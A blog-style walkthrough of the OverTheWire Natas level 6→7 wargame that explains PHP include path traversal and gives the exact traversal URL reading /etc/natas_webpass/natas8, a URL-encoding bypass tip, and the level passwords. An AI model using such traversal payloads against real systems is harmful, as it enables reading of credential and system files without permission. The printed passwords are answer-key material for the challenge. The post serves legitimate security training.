---
layout: post-with-comments
title: "OverTheWire Natas Level 6 → 7 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-6-to-7/
tags: [overthewire, natas, walkthrough, ctf, web, beginner]
description: "A step by step tutorial for OverTheWire Natas Level 6 → 7!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-5-to-6/' | relative_url }}">← Previous: Level 5 → 6</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas7.html" target="_blank" rel="noopener">
      Official (Level 7) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-7-to-8/' | relative_url }}">
      Next: Level 7 → 8 →
    </a>
  </div>
</nav>

## Login

URL: [http://natas7.natas.labs.overthewire.org](http://natas7.natas.labs.overthewire.org)

Credentials: **natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS**

![homepage]({{ '/assets/images/natas/level-6-to-7/homepage.jpg' | relative_url }})

## Task

The site shows two links (“Home”, “About”). The URL includes a parameter:

```
index.php?page=home
```

Find a way to read the file that stores the password for **natas8**.

## A little bit of Theory

* Many PHP sites use `include`/`require` with a **user-controlled filename** (e.g., `?page=home`).
* If no sanitization is done, you can perform **path traversal** using `../` to climb directories and read files outside the web root.
* On Natas, the next level’s password is usually under:

```
/etc/natas_webpass/<username>
```

**Further reading:**

* <a href="https://owasp.org/www-community/attacks/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a>
* <a href="https://www.php.net/manual/en/function.include.php" target="_blank" rel="noopener">PHP: include</a>

## Solution

1. **Inspect the page parameter**

   Current URL pattern:

   ```
   http://natas7.natas.labs.overthewire.org/index.php?page=home
   ```

2. **Traverse to the password file**

   Replace the value of `page` with a traversal path to the natas8 password:

   ```
   http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../../etc/natas_webpass/natas8
   ```

3. **Read the output**

   The response prints the contents of that file — the password for **natas8**.

![success]({{ '/assets/images/natas/level-6-to-7/success.jpg' | relative_url }})

## Password

```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

**Troubleshooting**

* Shows the normal page again? → Ensure you kept `index.php?page=...` and used enough `../` segments.
* URL-encoding issues? → Try `%2e%2e%2f` instead of `../` if the app blocks the raw dots/slashes.
* 403/404? → Double-check the exact target path: `/etc/natas_webpass/natas8`.

---

**Nice job 🎉** You spotted an include-by-parameter pattern and used path traversal to exfiltrate the next level’s password!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
